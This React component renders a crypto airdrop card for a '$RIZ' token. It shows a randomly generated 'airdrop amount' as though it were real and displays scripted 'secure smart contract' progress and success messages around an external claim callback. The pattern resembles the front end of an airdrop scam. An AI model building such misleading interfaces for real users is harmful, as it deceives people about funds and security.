'use client';

import { useState, useEffect } from 'react';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { toast } from 'sonner';
import { Loader2 } from 'lucide-react';

interface AirdropCardProps {
  title: string;
  subtitle?: string;
  onClaim: () => Promise<void>;
}

export function AirdropCard({ title, subtitle, onClaim }: AirdropCardProps) {
  const [amount, setAmount] = useState<number>(0);
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [currentStep, setCurrentStep] = useState<number>(0);

  // Generate a random amount between 500 and 5000
  useEffect(() => {
    const randomAmount = Math.floor(Math.random() * 4501) + 500; // 500 to 5000
    setAmount(randomAmount);
  }, []);

  const handleClaim = async () => {
    if (isLoading) return;

    try {
      setIsLoading(true);

      // Step 1: Contract deployment or connection check
      setCurrentStep(1);
      toast.info('Initializing smart contract...', {
        duration: 3000,
      });

      // Step 2: Transaction preparation
      setTimeout(() => {
        setCurrentStep(2);
        toast.info('Preparing secure transaction through smart contract...', {
          duration: 3000,
        });
      }, 2000);

      // Call actual claim function
      await onClaim();

      // Step 3: Success
      setCurrentStep(3);
      toast.success('Funds successfully transferred through secure smart contract!');
    } catch (error: any) {
      console.error('Claim error:', error);
      toast.error(error.message || 'Failed to claim rewards. Please try again.');
    } finally {
      setIsLoading(false);
      setCurrentStep(0);
    }
  };

  const getButtonText = () => {
    if (!isLoading) return 'Claim rewards';

    switch (currentStep) {
      case 1:
        return 'Initializing...';
      case 2:
        return 'Transferring...';
      case 3:
        return 'Completed!';
      default:
        return 'Processing...';
    }
  };

  return (
    <Card className="rounded-lg border border-[#23262E] bg-[#13161B] p-6 min-h-48 overflow-hidden">
      <CardContent className="flex flex-col h-full justify-between p-0">
        <div className="flex flex-col">
          <span className="text-base text-white font-bold">{title}</span>
          {subtitle && <span className="text-sm text-gray-400 font-normal">{subtitle}</span>}
        </div>

        <div className="flex flex-row justify-between items-center mt-6">
          <div className="flex flex-col">
            <span className="text-sm text-gray-400 font-normal">Airdrop amount</span>
            <span className="text-lg text-white font-bold">{amount} $RIZ</span>
          </div>

          <Button
            onClick={handleClaim}
            disabled={isLoading}
            className="bg-[#62e88b] text-black font-bold rounded-[10px] hover:bg-[#62e88b]/80 h-11 w-36 text-base flex items-center justify-center gap-2"
          >
            {isLoading && <Loader2 className="h-4 w-4 animate-spin" />}
            {getButtonText()}
          </Button>
        </div>
      </CardContent>
    </Card>
  );
}
